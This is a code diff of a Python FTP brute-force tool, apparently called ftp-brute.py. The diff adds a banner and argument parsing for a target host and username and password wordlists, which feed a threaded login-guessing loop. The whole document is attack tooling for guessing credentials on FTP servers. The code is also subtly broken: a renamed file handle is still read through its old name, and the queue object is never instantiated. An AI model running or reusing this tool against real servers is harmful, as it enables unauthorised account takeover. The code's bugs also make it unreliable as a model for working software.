@@ -2,6 +2,8 @@ import ftplib
 import pyfiglet
 import queue
 from threading import Thread
+import sys
+
 
 q = queue.Queue
 threads = 10
@@ -9,6 +11,18 @@ host = ''
 userList = []
 passList = []
 port = 21
+
+ascii_banner = pyfiglet.figlet_format("FTP Brute")
+print(ascii_banner)
+
+if len(sys.argv) == 4:
+    host = sys.argv[1]
+    userFile = sys.argv[2]
+    passFile = sys.argv[3]
+else:
+    print("Usage: ftp-brute.py $host $userFile $passwordFile")
+    exit()
+
 
 def login(user,password):
     server = ftplib.FTP()
@@ -26,10 +40,10 @@ def login(user,password):
     finally:
         q.task_done
 
-g = open(userFile, 'r')
+f = open(userFile, 'r')
 for line in g:
     userList.append(line)
-g.close()
+f.close()
 
 g = open(passFile, 'r')
 for line in g:
